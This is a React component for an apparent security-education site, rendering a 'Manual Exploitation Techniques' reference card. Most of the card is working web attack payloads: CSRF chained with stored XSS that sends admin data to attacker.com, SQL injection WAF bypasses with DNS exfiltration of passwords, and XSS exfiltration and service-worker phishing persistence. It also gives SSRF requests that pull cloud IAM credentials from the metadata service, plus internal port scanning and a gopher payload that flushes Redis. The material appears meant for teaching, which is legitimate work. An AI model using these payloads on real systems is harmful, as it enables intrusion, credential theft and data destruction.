
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Zap } from 'lucide-react';

const ManualExploitationTechniques: React.FC = () => {
  return (
    <Card className="bg-cybr-card border-cybr-muted">
      <CardHeader>
        <div className="flex items-center gap-2">
          <Zap className="h-6 w-6 text-cybr-primary" />
          <CardTitle className="text-cybr-primary">Manual Exploitation Techniques</CardTitle>
        </div>
      </CardHeader>
      <CardContent className="space-y-6">
        {/* Chaining Vulnerabilities */}
        <div className="space-y-4">
          <h4 className="text-lg font-semibold text-cybr-accent">Vulnerability Chaining & Multi-Step Attacks</h4>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">CSRF + Stored XSS Chain</h5>
            <p className="text-sm mb-3 opacity-80">
              Combining CSRF to inject persistent XSS payload for maximum impact.
            </p>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`<!-- CSRF form to inject XSS payload -->
<form action="https://target.com/comment" method="POST" id="csrf-form">
  <input type="hidden" name="comment" value="<script>
    // Persistent XSS payload
    fetch('/admin/users', {credentials: 'include'})
    .then(r => r.text())
    .then(data => {
      // Exfiltrate admin data
      fetch('//attacker.com/log?data=' + btoa(data));
    });
  </script>">
  <input type="hidden" name="csrf_token" value="extracted_token">
</form>

<script>
// Auto-submit CSRF form
document.getElementById('csrf-form').submit();
</script>`}
            </pre>
          </div>

          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">IDOR + Privilege Escalation Chain</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# Step 1: IDOR to access other user's data
GET /api/users/1234/profile HTTP/1.1
# Response reveals admin flag or higher privileges

# Step 2: Use discovered info for privilege escalation
POST /api/users/1234/role HTTP/1.1
Content-Type: application/json

{"role": "admin", "permissions": ["read", "write", "delete"]}

# Step 3: Access admin functions
GET /api/admin/users HTTP/1.1
Authorization: Bearer elevated_token`}
            </pre>
          </div>
        </div>

        {/* Advanced SQL Injection */}
        <div className="space-y-4">
          <h4 className="text-lg font-semibold text-cybr-accent">Advanced SQL Injection Exploitation</h4>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">WAF Bypass Techniques</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# Comment-based bypass
'; /*! SELECT */ * FROM users; --

# Encoding bypass
%27%20UNION%20SELECT%20*%20FROM%20users--

# Case variation bypass
' UnIoN SeLeCt * FrOm users--

# Function-based bypass
'; REVERSE(SELECT * FROM users); --

# Time-delay with complex conditions
'; IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))>65, SLEEP(5), 0); --

# DNS exfiltration
'; SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users WHERE id=1), '.attacker.com\\\\test.txt')); --`}
            </pre>
          </div>

          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">Second-Order SQL Injection</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# Phase 1: Inject payload into storage
POST /register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=test123&email=test@test.com

# Phase 2: Trigger execution in different context
POST /search HTTP/1.1
Content-Type: application/x-www-form-urlencoded

query=admin
# Backend query: SELECT * FROM posts WHERE author='admin'--'
# Injected payload executes in search context`}
            </pre>
          </div>
        </div>

        {/* Complex XSS Payloads */}
        <div className="space-y-4">
          <h4 className="text-lg font-semibold text-cybr-accent">Complex XSS Payload Engineering</h4>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">CSP Bypass Techniques</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`<!-- CSP: script-src 'self' 'unsafe-inline' -->
<!-- Bypass using existing JS libraries -->
<script src="/js/jquery.js"></script>
<div id="payload" data-payload="alert('XSS')"></div>
<script>
$('#payload').each(function() {
  eval($(this).data('payload'));
});
</script>

<!-- JSONP callback abuse -->
<script src="https://trusted-domain.com/api/data?callback=alert"></script>

<!-- CSS-based data exfiltration -->
<style>
input[value^="a"] { background: url(//attacker.com/a); }
input[value^="b"] { background: url(//attacker.com/b); }
/* ... continue for all characters */
</style>`}
            </pre>
          </div>

          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">DOM-based XSS Exploitation</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`// URL: https://target.com/page#<script>alert('XSS')</script>

// Vulnerable code:
document.getElementById('content').innerHTML = location.hash.slice(1);

// Advanced payload with sandbox escape:
#<img src=x onerror="
  // Create new window to escape sandbox
  var w = window.open('', '_blank');
  w.document.write('<script>
    // Access parent domain storage
    fetch(\'/api/sensitive\').then(r=>r.text()).then(d=>
      fetch(\"//attacker.com/steal?data=\" + btoa(d))
    );
  </script>');
">

// Service Worker registration for persistence:
#<script>
navigator.serviceWorker.register('data:text/javascript,
  self.addEventListener("fetch", e => {
    if(e.request.url.includes("/login")) {
      e.respondWith(fetch("//attacker.com/phish"));
    }
  });
');
</script>`}
            </pre>
          </div>
        </div>

        {/* Advanced SSRF */}
        <div className="space-y-4">
          <h4 className="text-lg font-semibold text-cybr-accent">Advanced SSRF Exploitation</h4>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">Cloud Metadata Attacks</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# AWS IMDSv2 bypass techniques
# Step 1: Get session token
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"

# Step 2: Use token to access metadata
curl -H "X-aws-ec2-metadata-token: TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Protocol smuggling for bypass
gopher://169.254.169.254:80/_GET%20/latest/meta-data/iam/security-credentials/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a

# DNS rebinding attack
# Set up DNS: attacker.com -> 169.254.169.254
fetch('http://attacker.com/latest/meta-data/iam/security-credentials/')

# IPv6 localhost bypass
http://[::1]/
http://[0:0:0:0:0:0:0:1]/

# Decimal/Hex IP encoding
http://2130706433/ (127.0.0.1 in decimal)
http://0x7F000001/ (127.0.0.1 in hex)`}
            </pre>
          </div>

          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">Internal Network Pivoting</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# Port scanning internal network
for port in 22 23 80 443 3389 5432 3306; do
  echo "Scanning port $port:"
  time curl -m 1 "http://ssrf-target.com/fetch?url=http://192.168.1.1:$port"
done

# Service discovery and banner grabbing
# HTTP services
curl "http://ssrf-target.com/fetch?url=http://192.168.1.100:8080"

# FTP banner grab via Gopher
curl "http://ssrf-target.com/fetch?url=gopher://192.168.1.50:21/_"

# Redis exploitation
curl "http://ssrf-target.com/fetch?url=gopher://192.168.1.200:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a"

# MySQL information gathering
curl "http://ssrf-target.com/fetch?url=gopher://192.168.1.100:3306/_%A3%00%00%01%85%A6%FF%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00"`}
            </pre>
          </div>
        </div>
      </CardContent>
    </Card>
  );
};

export default ManualExploitationTechniques;
